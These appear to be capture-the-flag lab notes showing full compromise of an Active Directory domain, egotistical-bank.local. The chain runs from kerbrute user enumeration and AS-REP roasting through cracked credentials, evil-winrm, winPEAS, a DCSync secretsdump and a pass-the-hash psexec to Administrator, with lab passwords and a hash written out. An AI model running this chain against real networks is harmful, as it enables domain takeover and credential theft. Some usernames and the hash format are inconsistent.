nmap shows port 80, smb, rpc, ldap open. we only get the domani as egotistical-bank.local
add that to /etc/hosts
smbclient, rpcclient, ldapsearch all locked down
Webpage gives us names for a few users
Use /opt/name_to_username/username_generate.py to generate usernames from it

validate usernames using kerbrute
`/kerbrute userenum --dc 10.129.237.138 -d egotistical-bank.local usernames.txt`
got valid username fsmith@egotistical-bank.local

Check for asrep roasting
`impacket-GetNPUsers egotistical-bank.local/ -dc-ip 10.129.237.138 -usersfile valid_usernames.txt -format john -outputfile hashes.txt -no-pass`
we get an asrep hash. john it for the password fsmith@egotistical-bank.local:Thestrokes23

Tried to smbclient, crackmapexec smb with that username:pass, no success
Winrm worked, got users.txt
`evil-winrm -i egotistical-bank.local -u fsmith@egotistical-bank.local -p Thestrokes23`

Tried to kerberoast Hsmith, but ntdate wasnt working, I think

Pushed winPEASx64.exe to JSmith, found autologin creds for svc-loanmgr
EGOTISTICALBANK\svc_loanmanager : Moneymakestheworldgoround!
`net users svc_loanmgr` showed he is remote management user, so winrm

Looking at bloodhound, we see this user has DCSync over the domain
So, just use impacket secrets-dump

`impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.237.138`
Get the administrator hash and use psexec
`impacket-psexec Administrator@10.129.237.138 -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e`